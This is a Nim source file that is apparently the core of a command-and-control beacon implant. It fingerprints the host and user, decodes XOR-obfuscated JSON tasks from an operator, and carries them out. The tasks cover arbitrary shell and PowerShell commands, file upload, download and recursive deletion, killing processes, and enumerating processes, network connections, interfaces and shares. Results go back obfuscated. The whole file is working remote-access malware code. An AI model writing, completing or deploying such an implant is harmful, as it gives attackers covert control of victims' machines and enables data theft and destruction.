import json
import std/strutils
import os
import osproc
import std/base64
import std/random
import std/options
import std/algorithm
import std/times
import std/strformat
import std/sequtils
import system
import posix

when defined(windows):
  import winlean
  import std/widestrs


proc toString*(str: seq[uint8]): string =
  result = newStringOfCap(len(str))
  for ch in str:
    add(result, char(ch))


proc xorEncode*(key, data: string): seq[uint8] =
  var result: seq[uint8]
  if key.len == 0:
    for ch in data:
      result.add(uint8(int(ch)))
    return result

  var j = 0
  for i in countup(0, data.len - 1):
    if j == key.len:
      j = 0
    result.add(uint8(int(data[i])) xor uint8(int(key[j])))
    inc j

  result

const
  instructionMsgTag* = "INS"
  uuidMsgTag* = "UID"
  cmdMsgTag* = "CM"
  returnValueTag* = "RV"
  inputFileTag* = "IF"
  outputFileTag* = "OF"
  dataTag* = "DA"
  argsTag* = "AR"
  pidTag* = "PI"
  errorCodeTag* = "EC"

  beaconHashMsgTag* = "BH"
  listenerHashMsgTag* = "LH"
  usernameMsgTag* = "UN"
  hostnameMsgTag* = "HN"
  archMsgTag* = "ARC"
  privilegeMsgTag* = "PR"
  osMsgTag* = "OS"
  lastProofOfLifeMsgTag* = "POF"
  sessionsMsgTag* = "SS"
  internalIpsMsgTag* = "IIPS"
  processIdMsgTag* = "PID"
  additionalInfoMsgTag* = "ADI"

  emptyString* = ""
  zeroString* = "0"
  alphabetChars* = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
  privilegeHigh* = "high"
  privilegeLow* = "low"
  okMessage* = "OK."
  fileExistsMessage* = "File already exists."
  fileDoesNotExistMessage* = "File doesn't exist."
  fileReadFailureMessage* = "Failed to read file"
  fileWriteFailureMessage* = "Failed to write file"
  changeDirFailureMessage* = "Failed to change directory"
  missingSleepValueMessage* = "Missing sleep value"
  invalidSleepValueMessage* = "Invalid sleep value"
  unknownInstructionMessage* = "Unknown instruction"
  loadModuleNotRequiredMessage* = "Load Module is not required for this beacon"
  missingPathMessage* = "Missing path argument"
  missingFilePathMessage* = "Missing file path"
  missingCommandMessage* = "Missing command"
  operationNotSupportedMessage* = "Operation not supported on this platform"
  commandExecutionFailureMessage* = "Failed to execute command"
  killProcessFailureMessage* = "Failed to terminate process"
  invalidProcessIdMessage* = "Invalid process identifier"
  directoryCreationFailureMessage* = "Failed to create directory"
  removeFailureMessage* = "Failed to remove target"
  environmentVariableNotFoundMessage* = "Environment variable not found"
  treeGenerationFailureMessage* = "Failed to enumerate directory tree"

  instructionLoadModule* = "loadmodule"
  instructionLs* = "ls"
  instructionListDirectory* = "listdirectory"
  instructionPs* = "ps"
  instructionListProcesses* = "listprocesses"
  instructionCd* = "cd"
  instructionChangeDirectory* = "changedirectory"
  instructionPwd* = "pwd"
  instructionPrintWorkingDirectory* = "printworkingdirectory"
  instructionDownload* = "download"
  instructionUpload* = "upload"
  instructionRun* = "run"
  instructionShell* = "shell"
  instructionPowershell* = "powershell"
  instructionSleep* = "sleep"
  instructionCat* = "cat"
  instructionMkDir* = "mkdir"
  instructionRemove* = "remove"
  instructionKillProcess* = "killprocess"
  instructionTree* = "tree"
  instructionGetEnv* = "getenv"
  instructionWhoami* = "whoami"
  instructionNetstat* = "netstat"
  instructionIpConfig* = "ipconfig"
  instructionEnumerateShares* = "enumerateshares"

type
  C2Message* = object
    instruction*: string
    cmd*: string
    returnValue*: string
    inputFile*: string
    outputFile*: string
    data*: string
    args*: string
    uuid*: string
    pid*: int
    errorCode*: Option[int]


type
    Beacon* = ref object of RootObj
        beaconHash*: string
        hostname*: string
        username*: string
        arch*: string
        privilege*: string
        os*: string
        listenerHash*: string
        lastProofOfLife*: string
        internalIps*: string
        processId*: string
        additionalInfo*: string
        sleepTimeMs*: int
        xorKey*: string

        tasks: seq[C2Message]
        taskResults*: seq[C2Message]


proc initBeacon*(self: Beacon) =

    var alphabet = alphabetChars
    randomize()
    var hash = emptyString
    for i in 0..32-1:
        hash = hash & alphabet[rand(len(alphabet)-1)]

    self.beaconHash = hash
    const size = 256

    let hostname = newString(size)
    var success = gethostname(hostname, size) == 0
    let nullPos = hostname.find('\0')
    self.hostname = hostname
    if nullPos != -1:
        let finalHostname = hostname.substr(0, nullPos - 1)
        self.hostname = finalHostname

    var uid = geteuid()
    var gid = getegid()

    var login: cstring
    login = getlogin()
    
    self.username = $login
    self.arch = hostCPU
    if gid==0 or uid==0:
        self.privilege = privilegeHigh
    else:
        self.privilege = privilegeLow
    self.os = hostOS
    self.sleepTimeMs = 1000
    self.listenerHash = emptyString
    self.lastProofOfLife = zeroString
    self.internalIps = emptyString
    self.processId = $getpid()
    self.additionalInfo = emptyString
    self.xorKey = emptyString
    self.tasks = @[]
    self.taskResults = @[]


proc encodeString(data: string): string =
  if data.len == 0:
    return emptyString
  encode(data.toOpenArrayByte(0, data.high))


proc decodeString(data: string): string =
  if data.len == 0:
    return emptyString
  try:
    return decode(data)
  except CatchableError:
    return emptyString


proc buildCommand(cmd, args: string): string =
  if cmd.len == 0:
    return args
  if args.len == 0:
    return cmd
  cmd & " " & args


proc normalizePath(path: string): string =
  if path.len == 0:
    return path
  try:
    result = absolutePath(path)
  except OSError:
    result = path


proc handleLoadModule(): string =
  loadModuleNotRequiredMessage


proc handleChangeDirectory(path: string): string =
  if path.len == 0:
    return missingPathMessage
  try:
    setCurrentDir(path)
    return getCurrentDir()
  except OSError:
    return changeDirFailureMessage


proc formatPermissions(perms: set[FilePermission], kind: PathComponent): string =
  var result = newString(10)
  result[0] = (case kind
    of pcDir: 'd'
    of pcLinkToDir, pcLinkToFile: 'l'
    else: '-'
  )
  let flags = [
    (fpUserRead, 'r'), (fpUserWrite, 'w'), (fpUserExec, 'x'),
    (fpGroupRead, 'r'), (fpGroupWrite, 'w'), (fpGroupExec, 'x'),
    (fpOthersRead, 'r'), (fpOthersWrite, 'w'), (fpOthersExec, 'x')
  ]
  for idx, entry in pairs(flags):
    result[idx + 1] = if entry[0] in perms: entry[1] else: '-'
  result


proc alignRight(value: string, width: int, fillChar: char = ' '): string =
  if value.len >= width:
    return value
  repeat(fillChar, width - value.len) & value


proc formatTimestamp(value: times.Time): string =
  value.format("MMM dd HH:mm")


proc formatDirectoryEntry(path: string, name: string, info: FileInfo): string =
  let perms = formatPermissions(info.permissions, info.kind)
  let sizeStr = alignRight($info.size, 12)
  let timestamp = formatTimestamp(info.lastWriteTime)
  fmt"{perms} {sizeStr} {timestamp} {name}"


proc collectDirectoryEntries(target: string): tuple[entries: seq[string], error: string] =
  var result: seq[string] = @[]
  try:
    let info = getFileInfo(target, followSymlink = false)
    result.add(formatDirectoryEntry(target, ".", info))
  except CatchableError:
    return (@[], changeDirFailureMessage)

  let parent = parentDir(target)
  if parent.len > 0 and dirExists(parent):
    try:
      let parentInfo = getFileInfo(parent, followSymlink = false)
      result.add(formatDirectoryEntry(parent, "..", parentInfo))
    except CatchableError:
      discard

  var entries: seq[(string, FileInfo)] = @[]
  try:
    for entry in walkDir(target, relative = true):
      let name = entry.path
      let fullPath = target / name
      try:
        let info = getFileInfo(fullPath, followSymlink = false)
        entries.add((name, info))
      except CatchableError:
        continue
  except OSError:
    return (@[], changeDirFailureMessage)

  entries.sort(proc(a, b: (string, FileInfo)): int =
    cmp(a[0].toLowerAscii(), b[0].toLowerAscii())
  )

  for entry in entries:
    result.add(formatDirectoryEntry(target / entry[0], entry[0], entry[1]))

  (result, emptyString)


proc handleListDirectory(path: string): string =
  var target = path
  if target.len == 0:
    target = getCurrentDir()
  if fileExists(target) and not dirExists(target):
    try:
      let info = getFileInfo(target, followSymlink = false)
      return formatDirectoryEntry(target, lastPathPart(target), info)
    except CatchableError:
      return fileDoesNotExistMessage
  if not dirExists(target):
    return fileDoesNotExistMessage

  let (entries, error) = collectDirectoryEntries(target)
  if error.len > 0:
    return error
  entries.join("\n")


when defined(linux):
  proc isNumeric(value: string): bool =
    result = value.len > 0
    for ch in value:
      if ch notin {'0'..'9'}:
        return false


  proc readProcessCommandLine(path: string): string =
    try:
      let data = readFile(path)
      if data.len == 0:
        return emptyString
      var parts = data.split('\0')
      parts = parts.filter(proc(x: string): bool = x.len > 0)
      if parts.len == 0:
        return emptyString
      parts.join(" ")
    except CatchableError:
      emptyString


  proc readProcessStat(path: string): tuple[ppid: string, name: string] =
    try:
      let content = readFile(path).strip()
      if content.len == 0:
        return (emptyString, emptyString)
      var fields: seq[string] = @[]
      var buffer = emptyString
      var insideName = false
      for ch in content:
        if ch == '(' and not insideName:
          insideName = true
          continue
        if ch == ')' and insideName:
          fields.add(buffer)
          buffer = emptyString
          insideName = false
          continue
        if insideName:
          buffer.add(ch)
          continue
        if ch == ' ':
          if buffer.len > 0:
            fields.add(buffer)
            buffer = emptyString
        else:
          buffer.add(ch)
      if buffer.len > 0:
        fields.add(buffer)
      let ppid = if fields.len > 4: fields[4] else: emptyString
      let name = if fields.len > 1: fields[1] else: emptyString
      (ppid, name)
    except CatchableError:
      (emptyString, emptyString)


proc handleListProcesses(): string =
  when defined(windows):
    const TH32CS_SNAPPROCESS = 0x00000002.DWORD

    type
      ProcessEntry32A = object
        dwSize: DWORD
        cntUsage: DWORD
        th32ProcessID: DWORD
        th32DefaultHeapID: ULONG_PTR
        th32ModuleID: DWORD
        cntThreads: DWORD
        th32ParentProcessID: DWORD
        pcPriClassBase: LONG
        dwFlags: DWORD
        szExeFile: array[MAX_PATH, char]

    proc CreateToolhelp32Snapshot(dwFlags: DWORD, th32ProcessID: DWORD): HANDLE {.stdcall, dynlib: "kernel32", importc.}
    proc Process32FirstA(hSnapshot: HANDLE, lppe: ptr ProcessEntry32A): WINBOOL {.stdcall, dynlib: "kernel32", importc.}
    proc Process32NextA(hSnapshot: HANDLE, lppe: ptr ProcessEntry32A): WINBOOL {.stdcall, dynlib: "kernel32", importc.}

    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0.DWORD)
    if snapshot == INVALID_HANDLE_VALUE:
      return commandExecutionFailureMessage
    var entry: ProcessEntry32A
    entry.dwSize = DWORD(sizeof(entry))
    var lines: seq[string] = @["PID\tPPID\tThreads\tExecutable"]
    var success = Process32FirstA(snapshot, addr entry) != 0
    while success:
      let exeName = $cast[cstring](addr entry.szExeFile[0])
      lines.add(fmt"{entry.th32ProcessID}\t{entry.th32ParentProcessID}\t{entry.cntThreads}\t{exeName}")
      success = Process32NextA(snapshot, addr entry) != 0
    discard CloseHandle(snapshot)
    lines.join("\n")
  elif defined(linux):
    let procDir = "/proc"
    if not dirExists(procDir):
      return operationNotSupportedMessage
    var entries: seq[tuple[pid: int, line: string]] = @[]
    for entry in walkDir(procDir, relative = true, skipSpecial = true):
      let name = entry.path
      if not isNumeric(name):
        continue
      let pid = parseInt(name)
      let basePath = procDir / name
      let cmdline = readProcessCommandLine(basePath / "cmdline")
      let statData = readProcessStat(basePath / "stat")
      let command = if cmdline.len > 0: cmdline else: statData.name
      let ppid = if statData.ppid.len > 0: statData.ppid else: "0"
      entries.add((pid, fmt"{pid}\t{ppid}\t{command}"))
    entries.sort(proc(a, b: tuple[pid: int, line: string]): int = cmp(a.pid, b.pid))
    var lines: seq[string] = @["PID\tPPID\tCommand"]
    for entry in entries:
      lines.add(entry.line)
    lines.join("\n")
  else:
    operationNotSupportedMessage


proc readFileContents(path: string, data: var string): string =
  data = emptyString
  if path.len == 0:
    return missingFilePathMessage
  if not fileExists(path):
    return fileDoesNotExistMessage
  try:
    var fileHandler = open(path, fmRead)
    data = fileHandler.readAll()
    fileHandler.close()
    okMessage
  except IOError:
    fileReadFailureMessage


proc handleDownload(path: string, data: var string): string =
  readFileContents(path, data)


proc handleUpload(path, content: string): string =
  if path.len == 0:
    return missingFilePathMessage
  if fileExists(path):
    return fileExistsMessage
  try:
    var fileHandler = open(path, fmWrite)
    fileHandler.write(content)
    fileHandler.close()
    okMessage
  except IOError:
    fileWriteFailureMessage


proc handleRun(command: string): string =
  if command.len == 0:
    return missingCommandMessage
  try:
    let parts = parseCmdLine(command)
    if parts.len == 0:
      return missingCommandMessage
    let executable = parts[0]
    let args = if parts.len > 1: parts[1..^1] else: @[]
    execProcess(executable, args = args, options = {poUsePath, poStdErrToStdOut})
  except CatchableError:
    commandExecutionFailureMessage


proc handlePowershell(command: string): string =
  if command.len == 0:
    return missingCommandMessage
  when defined(windows):
    try:
      execProcess("powershell", args=["-NoLogo", "-NoProfile", "-NonInteractive", "-Command", command], options={poUsePath})
    except OSError:
      commandExecutionFailureMessage
  else:
    operationNotSupportedMessage


proc handlePrintWorkingDirectory(): string =
  getCurrentDir()


proc handleCat(path: string): string =
  var content = emptyString
  let status = readFileContents(path, content)
  if status == okMessage:
    return content
  status


proc handleMkDir(path: string): string =
  if path.len == 0:
    return missingPathMessage
  if dirExists(path):
    return okMessage
  try:
    createDir(path)
    okMessage
  except OSError:
    directoryCreationFailureMessage


proc removePathRecursively(path: string): bool =
  if fileExists(path) or symlinkExists(path):
    try:
      removeFile(path)
      return true
    except OSError:
      return false
  if dirExists(path):
    var success = true
    try:
      for kind, entryPath in walkDir(path):
        if kind in {pcDir, pcLinkToDir}:
          if not removePathRecursively(entryPath):
            success = false
        else:
          try:
            removeFile(entryPath)
          except OSError:
            success = false
      removeDir(path)
    except OSError:
      success = false
    return success
  false


proc handleRemove(path: string): string =
  if path.len == 0:
    return missingPathMessage
  if not (fileExists(path) or dirExists(path) or symlinkExists(path)):
    return fileDoesNotExistMessage
  if removePathRecursively(path):
    okMessage
  else:
    removeFailureMessage


proc handleKillProcess(pidValue: string): string =
  if pidValue.len == 0:
    return invalidProcessIdMessage
  var parsedPid: int
  try:
    parsedPid = parseInt(pidValue)
  except ValueError:
    return invalidProcessIdMessage
  when defined(windows):
    const PROCESS_TERMINATE = 0x0001.DWORD
    let processHandle = OpenProcess(PROCESS_TERMINATE, 0.WINBOOL, DWORD(parsedPid))
    if processHandle == 0:
      return killProcessFailureMessage
    let terminated = TerminateProcess(processHandle, 1.DWORD)
    discard CloseHandle(processHandle)
    if terminated != 0:
      okMessage
    else:
      killProcessFailureMessage
  else:
    if (kill(Pid(parsedPid), SIGTERM) == 0) or (kill(Pid(parsedPid), SIGKILL) == 0):
      okMessage
    else:
      killProcessFailureMessage


proc appendTree(path: string, prefix: string, result: var string) =
  var entries: seq[tuple[name: string, fullPath: string, isDir: bool]] = @[]
  try:
    for kind, entryPath in walkDir(path):
      let name = lastPathPart(entryPath)
      let isDir = kind == pcDir
      entries.add((name, entryPath, isDir))
  except OSError:
    result.add(prefix & treeGenerationFailureMessage & "\n")
    return
  sort(entries, proc(a, b: tuple[name: string, fullPath: string, isDir: bool]): int =
    cmp(a.name.toLowerAscii(), b.name.toLowerAscii())
  )
  for i, entry in entries:
    let isLast = i == entries.high
    let connector = if isLast: "└── " else: "├── "
    result.add(prefix & connector & entry.name & "\n")
    if entry.isDir:
      let childPrefix = prefix & (if isLast: "    " else: "│   ")
      appendTree(entry.fullPath, childPrefix, result)


proc handleTree(path: string): string =
  var target = path
  if target.len == 0:
    target = getCurrentDir()
  if dirExists(target):
    normalizePath(target)
    var result = target & "\n"
    appendTree(target, emptyString, result)
    return result
  if fileExists(target):
    normalizePath(target)
    return target
  fileDoesNotExistMessage


proc handleShell(command: string): string =
  handleRun(command)


proc handleGetEnv(name: string): string =
  let trimmed = name.strip()
  if trimmed.len == 0:
    return missingCommandMessage
  let value = getEnv(trimmed, emptyString)
  if value.len == 0:
    environmentVariableNotFoundMessage
  else:
    value


proc handleWhoami(): string =
  when defined(posix):
    let uid = geteuid()
    let pwdEntry = getpwuid(uid)
    if pwdEntry != nil and pwdEntry.pw_name != nil:
      return $pwdEntry.pw_name
    let login = getlogin()
    if login != nil:
      return $login
  elif defined(windows):
    var buffer: array[257, WCHAR]
    var size: DWORD = DWORD(buffer.len)
    if GetUserNameW(buffer.addr, addr size) != 0:
      return $cast[WideCString](buffer.addr)
  let candidates = ["USER", "USERNAME", "LOGNAME"]
  for name in candidates:
    let value = getEnv(name, emptyString)
    if value.len > 0:
      return value
  environmentVariableNotFoundMessage


when defined(linux):
  const tcpStates = [
    "UNKNOWN", "ESTABLISHED", "SYN_SENT", "SYN_RECV", "FIN_WAIT1",
    "FIN_WAIT2", "TIME_WAIT", "CLOSE", "CLOSE_WAIT", "LAST_ACK",
    "LISTEN", "CLOSING", "NEW_SYN_RECV"
  ]


  proc parseAddress(hexAddr: string): string =
    let parts = hexAddr.split(":")
    if parts.len != 2:
      return hexAddr
    let ipPart = parts[0]
    let portPart = parts[1]
    if ipPart.len != 8:
      return hexAddr
    try:
      let port = parseHexInt(portPart)
      let bytes = @[parseHexInt(ipPart[6..7]), parseHexInt(ipPart[4..5]), parseHexInt(ipPart[2..3]), parseHexInt(ipPart[0..1])]
      fmt"{bytes[0]}.{bytes[1]}.{bytes[2]}.{bytes[3]}:{port}"
    except CatchableError:
      hexAddr


  proc parseProcNet(path, proto: string, output: var seq[string]) =
    try:
      let content = readFile(path)
      let lines = content.splitLines()
      if lines.len <= 1:
        return
      for line in lines[1..^1]:
        let parts = line.splitWhitespace()
        if parts.len < 4:
          continue
        let localAddr = parseAddress(parts[1])
        let remoteAddr = parseAddress(parts[2])
        let stateIdx = try:
          parseHexInt(parts[3])
        except CatchableError:
          0
        let state = if stateIdx < tcpStates.len: tcpStates[stateIdx] else: tcpStates[0]
        output.add(fmt"{proto}\t{localAddr}\t{remoteAddr}\t{state}")
    except CatchableError:
      discard


when defined(posix):
  type
    Ifaddrs {.importc: "struct ifaddrs", header: "<ifaddrs.h>", final.} = object
      ifa_next*: ptr Ifaddrs
      ifa_name*: cstring
      ifa_flags*: cuint
      ifa_addr*: ptr Sockaddr
      ifa_netmask*: ptr Sockaddr
      ifa_data*: pointer

  proc getifaddrs(outAddrs: ptr ptr Ifaddrs): cint {.importc: "getifaddrs", header: "<ifaddrs.h>".}
  proc freeifaddrs(addrs: ptr Ifaddrs) {.importc: "freeifaddrs", header: "<ifaddrs.h>".}

  proc toIpString(sa: ptr Sockaddr): string =
    if sa == nil:
      return emptyString
    case cint(sa.sa_family)
    of AF_INET:
      var buffer: array[INET_ADDRSTRLEN, char]
      let sin = cast[ptr Sockaddr_in](sa)
      let dest = cast[cstring](addr buffer[0])
      if inet_ntop(AF_INET, addr sin.sin_addr, dest, buffer.len.int32) != nil:
        result = $dest
    of AF_INET6:
      var buffer: array[INET6_ADDRSTRLEN, char]
      let sin6 = cast[ptr Sockaddr_in6](sa)
      let dest = cast[cstring](addr buffer[0])
      if inet_ntop(AF_INET6, addr sin6.sin6_addr, dest, buffer.len.int32) != nil:
        result = $dest
    else:
      result = emptyString


proc handleNetstat(): string =
  when defined(linux):
    var lines: seq[string] = @["Proto\tLocal Address\tRemote Address\tState"]
    parseProcNet("/proc/net/tcp", "tcp", lines)
    parseProcNet("/proc/net/tcp6", "tcp6", lines)
    parseProcNet("/proc/net/udp", "udp", lines)
    parseProcNet("/proc/net/udp6", "udp6", lines)
    if lines.len == 1:
      return operationNotSupportedMessage
    lines.join("\n")
  else:
    operationNotSupportedMessage


proc handleIpConfig(): string =
  when defined(posix):
    var ifaddr: ptr Ifaddrs
    if getifaddrs(addr ifaddr) != 0:
      return commandExecutionFailureMessage
    var lines: seq[string] = @[]
    var cursor = ifaddr
    while cursor != nil:
      let rawName = cursor.ifa_name
      if rawName == nil:
        cursor = cursor.ifa_next
        continue
      let interfaceName = $rawName
      if interfaceName.len == 0:
        cursor = cursor.ifa_next
        continue
      let address = toIpString(cursor.ifa_addr)
      if address.len > 0:
        lines.add(fmt"{interfaceName}: {address}")
      cursor = cursor.ifa_next
    freeifaddrs(ifaddr)
    if lines.len == 0:
      return operationNotSupportedMessage
    lines.sort(proc(a, b: string): int = cmp(a, b))
    lines.join("\n")
  else:
    operationNotSupportedMessage


proc handleEnumerateShares(): string =
  when defined(windows):
    type
      SHARE_INFO_1 = object
        shi1_netname: LPWSTR
        shi1_type: DWORD
        shi1_remark: LPWSTR

    proc NetShareEnum(serverName: LPCWSTR, level: DWORD, buffer: ptr pointer, prefmaxlen: DWORD, entriesRead: ptr DWORD, totalEntries: ptr DWORD, resumeHandle: ptr DWORD): DWORD {.stdcall, dynlib: "Netapi32", importc.}
    proc NetApiBufferFree(buffer: pointer): DWORD {.stdcall, dynlib: "Netapi32", importc.}

    const NERR_Success = 0.DWORD
    var buffer: pointer
    var entriesRead: DWORD
    var totalEntries: DWORD
    var resume: DWORD
    let status = NetShareEnum(nil, 1.DWORD, addr buffer, DWORD(-1), addr entriesRead, addr totalEntries, addr resume)
    if status != NERR_Success:
      return commandExecutionFailureMessage
    var lines: seq[string] = @[]
    try:
      for i in 0 ..< int(entriesRead):
        let offset = cast[ByteAddress](buffer) + ByteAddress(i) * ByteAddress(sizeof(SHARE_INFO_1))
        let infoPtr = cast[ptr SHARE_INFO_1](offset)
        let name = $cast[WideCString](infoPtr.shi1_netname)
        let remark = if infoPtr.shi1_remark != nil: $cast[WideCString](infoPtr.shi1_remark) else: emptyString
        lines.add(if remark.len > 0: fmt"{name}\t{remark}" else: name)
    finally:
      discard NetApiBufferFree(buffer)
    if lines.len == 0:
      return operationNotSupportedMessage
    lines.join("\n")
  else:
    operationNotSupportedMessage


proc cmdToTasks*(self: Beacon, input: string) =
  if isEmptyOrWhitespace(input):
    return

  var decoded: string
  try:
    decoded = decode(input)
  except CatchableError:
    return

  let transformed = xorEncode(self.xorKey, decoded)
  let payload = toString(transformed)

  var jsonNode: JsonNode
  try:
    jsonNode = parseJson(payload)
  except JsonParsingError:
    return

  if jsonNode.kind != JArray:
    return

  for bundleNode in jsonNode:
    if bundleNode.kind != JObject:
      continue

    if bundleNode.hasKey(listenerHashMsgTag):
      self.listenerHash = bundleNode[listenerHashMsgTag].getStr()
    if bundleNode.hasKey(usernameMsgTag):
      self.username = bundleNode[usernameMsgTag].getStr()
    if bundleNode.hasKey(hostnameMsgTag):
      self.hostname = bundleNode[hostnameMsgTag].getStr()
    if bundleNode.hasKey(archMsgTag):
      self.arch = bundleNode[archMsgTag].getStr()
    if bundleNode.hasKey(privilegeMsgTag):
      self.privilege = bundleNode[privilegeMsgTag].getStr()
    if bundleNode.hasKey(osMsgTag):
      self.os = bundleNode[osMsgTag].getStr()
    if bundleNode.hasKey(lastProofOfLifeMsgTag):
      self.lastProofOfLife = bundleNode[lastProofOfLifeMsgTag].getStr()
    if bundleNode.hasKey(internalIpsMsgTag):
      self.internalIps = bundleNode[internalIpsMsgTag].getStr()
    if bundleNode.hasKey(processIdMsgTag):
      self.processId = bundleNode[processIdMsgTag].getStr()
    if bundleNode.hasKey(additionalInfoMsgTag):
      self.additionalInfo = bundleNode[additionalInfoMsgTag].getStr()

    let beaconHash = if bundleNode.hasKey(beaconHashMsgTag): bundleNode[beaconHashMsgTag].getStr() else: emptyString
    if beaconHash != self.beaconHash:
      continue

    if not bundleNode.hasKey(sessionsMsgTag):
      continue

    let sessions = bundleNode[sessionsMsgTag]
    if sessions.kind != JArray:
      continue

    for sessionNode in sessions:
      if sessionNode.kind != JObject:
        continue

      var message = C2Message(pid: -100, errorCode: none(int))

      if sessionNode.hasKey(instructionMsgTag):
        message.instruction = sessionNode[instructionMsgTag].getStr()
      if sessionNode.hasKey(cmdMsgTag):
        message.cmd = sessionNode[cmdMsgTag].getStr()
      if sessionNode.hasKey(argsTag):
        message.args = sessionNode[argsTag].getStr()
      if sessionNode.hasKey(uuidMsgTag):
        message.uuid = sessionNode[uuidMsgTag].getStr()
      if sessionNode.hasKey(pidTag):
        message.pid = sessionNode[pidTag].getInt()
      if sessionNode.hasKey(errorCodeTag):
        message.errorCode = some(sessionNode[errorCodeTag].getInt())

      if sessionNode.hasKey(returnValueTag):
        message.returnValue = decodeString(sessionNode[returnValueTag].getStr())
      if sessionNode.hasKey(inputFileTag):
        message.inputFile = decodeString(sessionNode[inputFileTag].getStr())
      if sessionNode.hasKey(outputFileTag):
        message.outputFile = decodeString(sessionNode[outputFileTag].getStr())
      if sessionNode.hasKey(dataTag):
        message.data = decodeString(sessionNode[dataTag].getStr())

      self.tasks.add(message)


proc execInstruction*(self: Beacon) =
  for task in self.tasks:
    var instruction = task.instruction
    var args = task.args
    var cmd = task.cmd
    var data = task.data
    var inputFile = task.inputFile
    var outputFile = task.outputFile
    var pid = task.pid

    let normalizedInstruction = instruction.toLowerAscii()

    var result = emptyString
    case normalizedInstruction:
    of instructionLoadModule:
      result = handleLoadModule()
    of instructionLs, instructionListDirectory:
      result = handleListDirectory(if cmd.len > 0: cmd else: args)
    of instructionPs, instructionListProcesses:
      result = handleListProcesses()
    of instructionCd, instructionChangeDirectory:
      result = handleChangeDirectory(if cmd.len > 0: cmd else: args)
    of instructionPwd, instructionPrintWorkingDirectory:
      result = handlePrintWorkingDirectory()
    of instructionDownload:
      let downloadPath =
        if inputFile.len > 0: inputFile
        elif cmd.len > 0: cmd
        else: args
      result = handleDownload(downloadPath, data)
    of instructionUpload:
      let uploadPath =
        if outputFile.len > 0: outputFile
        elif cmd.len > 0: cmd
        else: args
      result = handleUpload(uploadPath, data)
    of instructionRun:
      result = handleRun(buildCommand(cmd, args))
    of instructionShell:
      result = handleShell(buildCommand(cmd, args))
    of instructionPowershell:
      result = handlePowershell(if args.len > 0: args else: cmd)
    of instructionCat:
      let catPath = if cmd.len > 0: cmd elif inputFile.len > 0: inputFile else: args
      result = handleCat(catPath)
    of instructionMkDir:
      result = handleMkDir(if cmd.len > 0: cmd else: args)
    of instructionRemove:
      var target = if cmd.len > 0: cmd else: args
      if target.len == 0:
        target = if inputFile.len > 0: inputFile else: outputFile
      result = handleRemove(target)
    of instructionKillProcess:
      result = handleKillProcess(if cmd.len > 0: cmd else: args)
    of instructionTree:
      result = handleTree(if cmd.len > 0: cmd else: args)
    of instructionGetEnv:
      result = handleGetEnv(if cmd.len > 0: cmd else: args)
    of instructionWhoami:
      result = handleWhoami()
    of instructionNetstat:
      result = handleNetstat()
    of instructionIpConfig:
      result = handleIpConfig()
    of instructionEnumerateShares:
      result = handleEnumerateShares()
    of instructionSleep:
      let sleepValue = if cmd.len > 0: cmd else: args
      if not isEmptyOrWhitespace(sleepValue):
        try:
          self.sleepTimeMs = parseInt(sleepValue) * 1000
          result = okMessage
        except ValueError:
          result = invalidSleepValueMessage
      else:
        result = missingSleepValueMessage
    else:
      result = unknownInstructionMessage

    var taskResult = C2Message(
      instruction: instruction,
      cmd: cmd,
      args: args,
      data: data,
      inputFile: inputFile,
      outputFile: outputFile,
      pid: pid,
      uuid: task.uuid,
      returnValue: result,
      errorCode: none(int)
    )
    self.taskResults.add(taskResult)

  self.tasks.setLen(0)


proc taskResultsToCmd*(self: Beacon): string =
  var sessions = newJArray()

  for message in self.taskResults:
    var node = newJObject()
    if message.instruction.len > 0:
      node[instructionMsgTag] = %message.instruction
    if message.cmd.len > 0:
      node[cmdMsgTag] = %message.cmd
    if message.returnValue.len > 0:
      node[returnValueTag] = %encodeString(message.returnValue)
    if message.inputFile.len > 0:
      node[inputFileTag] = %encodeString(message.inputFile)
    if message.outputFile.len > 0:
      node[outputFileTag] = %encodeString(message.outputFile)
    if message.data.len > 0:
      node[dataTag] = %encodeString(message.data)
    if message.args.len > 0:
      node[argsTag] = %message.args
    if message.pid != -100:
      node[pidTag] = %message.pid
    if message.errorCode.isSome:
      node[errorCodeTag] = %message.errorCode.get()
    if message.uuid.len > 0:
      node[uuidMsgTag] = %message.uuid

    sessions.add(node)

  var bundle = newJObject()
  if self.beaconHash.len > 0:
    bundle[beaconHashMsgTag] = %self.beaconHash
  if self.listenerHash.len > 0:
    bundle[listenerHashMsgTag] = %self.listenerHash
  if self.username.len > 0:
    bundle[usernameMsgTag] = %self.username
  if self.hostname.len > 0:
    bundle[hostnameMsgTag] = %self.hostname
  if self.arch.len > 0:
    bundle[archMsgTag] = %self.arch
  if self.privilege.len > 0:
    bundle[privilegeMsgTag] = %self.privilege
  if self.os.len > 0:
    bundle[osMsgTag] = %self.os
  if self.lastProofOfLife.len > 0:
    bundle[lastProofOfLifeMsgTag] = %self.lastProofOfLife
  if self.internalIps.len > 0:
    bundle[internalIpsMsgTag] = %self.internalIps
  if self.processId.len > 0:
    bundle[processIdMsgTag] = %self.processId
  if self.additionalInfo.len > 0:
    bundle[additionalInfoMsgTag] = %self.additionalInfo
  if sessions.len > 0:
    bundle[sessionsMsgTag] = sessions

  var multi = newJArray()
  multi.add(bundle)

  let serialized = $multi
  let encrypted = xorEncode(self.xorKey, serialized)
  let encoded = encode(encrypted)

  self.taskResults.setLen(0)

  encoded
